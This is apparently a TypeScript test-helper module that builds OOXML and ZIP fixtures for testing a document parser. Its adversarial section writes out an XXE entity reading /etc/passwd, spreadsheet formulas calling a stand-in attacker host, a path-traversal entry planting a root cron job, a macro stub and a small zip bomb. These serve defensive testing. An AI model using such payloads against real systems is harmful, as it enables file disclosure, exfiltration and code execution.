if (typeof window !== "undefined") {
  throw new Error("This module is server-only and must not run in the browser.");
}

import { crc32, deflateRawSync } from "node:zlib";

/**
 * Deterministic OOXML builders for tests.
 *
 * WHY BUILD THE FILES RATHER THAN COMMIT THEM. A committed `.xlsx` is an
 * opaque blob: a reviewer cannot see what it contains, cannot tell a malicious
 * fixture from a benign one, and cannot change one cell without regenerating
 * something they cannot read. Built here, every byte of every fixture is
 * visible in the diff — which matters most for the ADVERSARIAL fixtures, where
 * the whole point of the test is what the file is trying to do.
 *
 * Entries are STORED, never deflated, so the bytes are reproducible across
 * Node and zlib versions. The parser's deflate path is exercised separately by
 * a fixture that compresses one entry deliberately.
 */

interface Entry {
  name: string;
  data: Buffer;
}

/** Build a ZIP with all entries stored (method 0). */
export function buildZip(entries: Entry[], options: { deflateFirst?: boolean } = {}): Buffer {
  const locals: Buffer[] = [];
  const centrals: Buffer[] = [];
  let offset = 0;

  entries.forEach((entry, index) => {
    const nameBytes = Buffer.from(entry.name, "utf8");
    const useDeflate = options.deflateFirst === true && index === 0;
    const payload = useDeflate ? deflateRawSync(entry.data) : entry.data;
    const crc = crc32(entry.data);

    const local = Buffer.alloc(30 + nameBytes.length);
    local.writeUInt32LE(0x04034b50, 0);
    local.writeUInt16LE(20, 4);
    local.writeUInt16LE(0, 6);
    local.writeUInt16LE(useDeflate ? 8 : 0, 8);
    local.writeUInt16LE(0, 10);
    local.writeUInt16LE(0, 12);
    local.writeUInt32LE(crc, 14);
    local.writeUInt32LE(payload.length, 18);
    local.writeUInt32LE(entry.data.length, 22);
    local.writeUInt16LE(nameBytes.length, 26);
    local.writeUInt16LE(0, 28);
    nameBytes.copy(local, 30);

    const central = Buffer.alloc(46 + nameBytes.length);
    central.writeUInt32LE(0x02014b50, 0);
    central.writeUInt16LE(20, 4);
    central.writeUInt16LE(20, 6);
    central.writeUInt16LE(0, 8);
    central.writeUInt16LE(useDeflate ? 8 : 0, 10);
    central.writeUInt16LE(0, 12);
    central.writeUInt16LE(0, 14);
    central.writeUInt32LE(crc, 16);
    central.writeUInt32LE(payload.length, 20);
    central.writeUInt32LE(entry.data.length, 24);
    central.writeUInt16LE(nameBytes.length, 28);
    central.writeUInt16LE(0, 30);
    central.writeUInt16LE(0, 32);
    central.writeUInt16LE(0, 34);
    central.writeUInt16LE(0, 36);
    central.writeUInt32LE(0, 38);
    central.writeUInt32LE(offset, 42);
    nameBytes.copy(central, 46);

    locals.push(local, payload);
    centrals.push(central);
    offset += local.length + payload.length;
  });

  const centralBuf = Buffer.concat(centrals);
  const eocd = Buffer.alloc(22);
  eocd.writeUInt32LE(0x06054b50, 0);
  eocd.writeUInt16LE(0, 4);
  eocd.writeUInt16LE(0, 6);
  eocd.writeUInt16LE(entries.length, 8);
  eocd.writeUInt16LE(entries.length, 10);
  eocd.writeUInt32LE(centralBuf.length, 12);
  eocd.writeUInt32LE(offset, 16);
  eocd.writeUInt16LE(0, 20);

  return Buffer.concat([...locals, centralBuf, eocd]);
}

const text = (s: string): Buffer => Buffer.from(s, "utf8");

const CONTENT_TYPES_XLSX = `<?xml version="1.0" encoding="UTF-8"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
<Default Extension="xml" ContentType="application/xml"/>
</Types>`;

const WORKBOOK_RELS = `<?xml version="1.0" encoding="UTF-8"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet1.xml"/>
<Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet2.xml"/>
</Relationships>`;

export interface SheetSpec {
  name: string;
  /** Rows of raw cell text. `null` leaves the cell absent entirely. */
  rows: Array<Array<string | null>>;
}

const COLUMN_LETTERS = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";

function sheetXml(rows: Array<Array<string | null>>): string {
  const body = rows
    .map((cells, rowIndex) => {
      const cellXml = cells
        .map((value, columnIndex) => {
          if (value === null) return "";
          const ref = `${COLUMN_LETTERS[columnIndex] ?? "A"}${rowIndex + 1}`;
          const escaped = value
            .replace(/&/g, "&amp;")
            .replace(/</g, "&lt;")
            .replace(/>/g, "&gt;");
          return `<c r="${ref}" t="inlineStr"><is><t>${escaped}</t></is></c>`;
        })
        .join("");
      return `<row r="${rowIndex + 1}">${cellXml}</row>`;
    })
    .join("");
  return `<?xml version="1.0" encoding="UTF-8"?>
<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><sheetData>${body}</sheetData></worksheet>`;
}

/** A workbook with one or two sheets of inline strings. */
export function buildXlsx(sheets: SheetSpec[], extra: Entry[] = []): Buffer {
  const sheetEntries: Entry[] = sheets.map((sheet, index) => ({
    name: `xl/worksheets/sheet${index + 1}.xml`,
    data: text(sheetXml(sheet.rows)),
  }));

  const workbookSheets = sheets
    .map(
      (sheet, index) =>
        `<sheet name="${sheet.name.replace(/&/g, "&amp;").replace(/</g, "&lt;")}" sheetId="${index + 1}" r:id="rId${index + 1}"/>`,
    )
    .join("");

  return buildZip([
    { name: "[Content_Types].xml", data: text(CONTENT_TYPES_XLSX) },
    { name: "xl/_rels/workbook.xml.rels", data: text(WORKBOOK_RELS) },
    {
      name: "xl/workbook.xml",
      data: text(`<?xml version="1.0" encoding="UTF-8"?>
<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"><sheets>${workbookSheets}</sheets></workbook>`),
    },
    ...sheetEntries,
    ...extra,
  ]);
}

/**
 * A workbook whose one data cell is a FORMULA with a cached value, plus a
 * second whose formula was never calculated. The parser must take the first
 * cached value and report the second as uncached — never evaluate either.
 */
export function buildFormulaXlsx(): Buffer {
  const sheet = `<?xml version="1.0" encoding="UTF-8"?>
<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><sheetData>
<row r="1"><c r="A1" t="inlineStr"><is><t>Product</t></is></c><c r="B1" t="inlineStr"><is><t>Brand</t></is></c><c r="C1" t="inlineStr"><is><t>SKU</t></is></c></row>
<row r="2">
  <c r="A2" t="inlineStr"><is><t>Formula Product</t></is></c>
  <c r="B2" t="str"><f>WEBSERVICE("https://attacker.invalid/x")</f><v>Cached Brand</v></c>
  <c r="C2" t="str"><f>HYPERLINK("https://attacker.invalid/y","click")</f></c>
</row>
</sheetData></worksheet>`;

  return buildZip([
    { name: "[Content_Types].xml", data: text(CONTENT_TYPES_XLSX) },
    {
      name: "xl/_rels/workbook.xml.rels",
      data: text(`<?xml version="1.0" encoding="UTF-8"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet1.xml"/>
</Relationships>`),
    },
    {
      name: "xl/workbook.xml",
      data: text(`<?xml version="1.0" encoding="UTF-8"?>
<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"><sheets><sheet name="Products" sheetId="1" r:id="rId1"/></sheets></workbook>`),
    },
    { name: "xl/worksheets/sheet1.xml", data: text(sheet) },
    {
      name: "xl/externalLinks/externalLink1.xml",
      data: text(`<?xml version="1.0"?><externalLink/>`),
    },
    { name: "xl/calcChain.xml", data: text(`<?xml version="1.0"?><calcChain/>`) },
  ]);
}

/* ------------------------------------------------------------------ docx */

const CONTENT_TYPES_DOCX = `<?xml version="1.0" encoding="UTF-8"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
<Default Extension="xml" ContentType="application/xml"/>
</Types>`;

export interface DocxParagraphSpec {
  text: string;
  heading?: number;
  /** Wrap the run in `w:del` — text the author struck out. */
  deleted?: boolean;
  /** Emit as an `w:instrText` field code instead of body text. */
  fieldCode?: boolean;
  /** Wrap the run in `<w:rPr><w:b/></w:rPr>`. */
  bold?: boolean;
}

/**
 * Table with rows of cells. Each cell is one paragraph inside `<w:tc>`.
 * Cell paragraphs may be `bold` for header-row styling. Everything else is
 * exercised by regular paragraph specs above.
 */
export interface DocxTableSpec {
  rows: Array<{
    cells: Array<{ text: string; bold?: boolean }>;
  }>;
}

export type DocxBodyElement = DocxParagraphSpec | { table: DocxTableSpec };

function renderParagraph(p: DocxParagraphSpec): string {
  const escaped = p.text
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");
  const style = p.heading ? `<w:pPr><w:pStyle w:val="Heading${p.heading}"/></w:pPr>` : "";
  if (p.fieldCode) {
    return `<w:p>${style}<w:r><w:instrText>${escaped}</w:instrText></w:r></w:p>`;
  }
  const rPr = p.bold ? "<w:rPr><w:b/></w:rPr>" : "";
  const run = `<w:r>${rPr}<w:t>${escaped}</w:t></w:r>`;
  return `<w:p>${style}${p.deleted ? `<w:del>${run}</w:del>` : run}</w:p>`;
}

function renderTable(table: DocxTableSpec): string {
  const rows = table.rows
    .map((r) => {
      const cells = r.cells
        .map((c) => `<w:tc>${renderParagraph({ text: c.text, bold: c.bold })}</w:tc>`)
        .join("");
      return `<w:tr>${cells}</w:tr>`;
    })
    .join("");
  return `<w:tbl>${rows}</w:tbl>`;
}

export function buildDocx(
  body: Array<DocxParagraphSpec> | Array<DocxBodyElement>,
  extra: Entry[] = [],
): Buffer {
  const rendered = (body as DocxBodyElement[])
    .map((el) => ("table" in el ? renderTable(el.table) : renderParagraph(el)))
    .join("");

  return buildZip([
    { name: "[Content_Types].xml", data: text(CONTENT_TYPES_DOCX) },
    {
      name: "word/document.xml",
      data: text(`<?xml version="1.0" encoding="UTF-8"?>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body>${rendered}</w:body></w:document>`),
    },
    ...extra,
  ]);
}

/* ------------------------------------------------------- adversarial files */

/** A workbook whose sheet XML carries a DOCTYPE with an external entity. */
export function buildXxeXlsx(): Buffer {
  const sheet = `<?xml version="1.0"?>
<!DOCTYPE worksheet [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><sheetData>
<row r="1"><c r="A1" t="inlineStr"><is><t>&xxe;</t></is></c></row>
</sheetData></worksheet>`;

  return buildZip([
    { name: "[Content_Types].xml", data: text(CONTENT_TYPES_XLSX) },
    {
      name: "xl/_rels/workbook.xml.rels",
      data: text(`<?xml version="1.0"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet1.xml"/>
</Relationships>`),
    },
    {
      name: "xl/workbook.xml",
      data: text(`<?xml version="1.0"?>
<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"><sheets><sheet name="S" sheetId="1" r:id="rId1"/></sheets></workbook>`),
    },
    { name: "xl/worksheets/sheet1.xml", data: text(sheet) },
  ]);
}

/** A macro-enabled workbook. Refused on the entry name alone. */
export function buildMacroXlsx(): Buffer {
  return buildZip([
    { name: "[Content_Types].xml", data: text(CONTENT_TYPES_XLSX) },
    { name: "xl/workbook.xml", data: text("<workbook/>") },
    { name: "xl/vbaProject.bin", data: Buffer.from([0xd0, 0xcf, 0x11, 0xe0, 0x00]) },
  ]);
}

/** An archive with an entry that tries to escape the container. */
export function buildTraversalZip(): Buffer {
  return buildZip([
    { name: "[Content_Types].xml", data: text(CONTENT_TYPES_XLSX) },
    { name: "../../../../etc/cron.d/payload", data: text("* * * * * root sh") },
  ]);
}

/** A highly compressible entry — a zip bomb in miniature. */
export function buildRatioBombXlsx(): Buffer {
  return buildZip(
    [
      { name: "xl/workbook.xml", data: Buffer.alloc(2 * 1024 * 1024, 0x41) },
      { name: "[Content_Types].xml", data: text(CONTENT_TYPES_XLSX) },
    ],
    { deflateFirst: true },
  );
}
